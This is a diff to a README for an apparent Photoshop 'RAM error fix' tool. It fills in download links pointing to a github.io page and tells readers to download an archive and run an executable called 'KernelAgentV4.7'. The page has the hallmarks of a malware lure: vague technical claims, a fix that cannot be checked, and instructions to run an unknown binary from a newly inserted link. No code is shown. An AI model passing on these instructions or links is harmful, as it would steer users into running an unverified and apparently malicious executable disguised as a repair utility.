@@ -2,13 +2,15 @@
 
 Resolve Photoshop memory-related crashes and allocation failures with this tool. It resets memory settings, clears hidden cache, and restores RAM access using `KernelAgentV4.7`.
 
-[![Download RAM Fix Tool](https://img.shields.io/badge/Download-Photoshop_RAM_Error_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download RAM Fix Tool](https://img.shields.io/badge/Download-Photoshop_RAM_Error_Fix-blueviolet)](https://photoshop-not-enough-ram-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://photoshop-not-enough-ram-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PhotoshopRAMFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will reset memory limits, purge caches, and adjust RAM allocation settings  
